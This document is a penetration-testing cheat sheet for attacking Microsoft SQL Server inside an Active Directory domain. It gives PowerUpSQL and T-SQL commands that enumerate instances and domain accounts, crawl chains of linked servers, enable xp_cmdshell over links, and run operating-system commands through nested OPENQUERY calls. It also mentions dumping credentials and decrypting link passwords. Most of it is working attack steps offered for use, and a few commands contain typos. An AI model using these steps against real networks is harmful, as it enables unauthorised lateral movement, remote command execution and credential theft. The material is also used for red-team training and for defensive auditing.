# Domain User accounts

* SQL server allows Domain user logins (it a part of the domain trust)
* Once domain user access is present, enumerate privileges it has on SQL servers in the domain

After gaining shell access to the user (command execution) following can be done:

Check if current user has access to SQL Servers in domain:
```
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

For alternative credentials:
```
unas /noprofile /netonly /user:<domain\username> powershell.exe
```

A user with `public` access can be used to enumerate domain accounts and groups in the forest and other trusted forests
```
Get-SQLFuzzDomainAccount -Instance instance -StartId 500 -EndId 2000 -Verbose
```
> https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/

If local admin rights are present, dump credentials.

# Database Links

* Allows a SQL Server to access external data sources (SQL Servers, OLE DB)
* If SQL Servers are linked:
  * Can execute stored procedures
  * Work across SQL server versions and forests

> https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-engine
> http://www.labofapenetrationtester.com/2017/03/using-sql-server-for-attacking-forest-trust.html

Search for linked databases:
```
select * from master..sysservers
```

```
Get-SQLServerLink -Instance instance -Verbose
```

Run queries on linked databases:
```
select * from openquery("instance",'select * frommaster..sysservers')
```

Run queries on chain of linked databases:
```
select * from openquery("inatance1",'select * from openquery("instance2",''select * from master..sysservers'')')
```

```
Get-SQLServerLinkCrawl -Instance instance1 -Verbose
```

If `rpcout` is enabled for all links (disabled by default), `xp_cmdshell` can be enabled using:

```
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "instance2")
```

Command execution with linked databases:

```
select * from openquery("instance1",'select * from
openquery("instance2",''select * from openquery("instance3",''''select @@version as version;exec master..xp_cmdshell "cmd /c calc.exe"'''')'')')
```

```
Get-SQLServerLinkCrawl -Instance instance1 -Query "exec master..xp_cmdshell 'cmd /c calc.exe'"-Verbose
```

Decrypting Database Link Server Passwords:

> https://blog.netspi.com/decrypting-mssql-database-link-server-passwords/
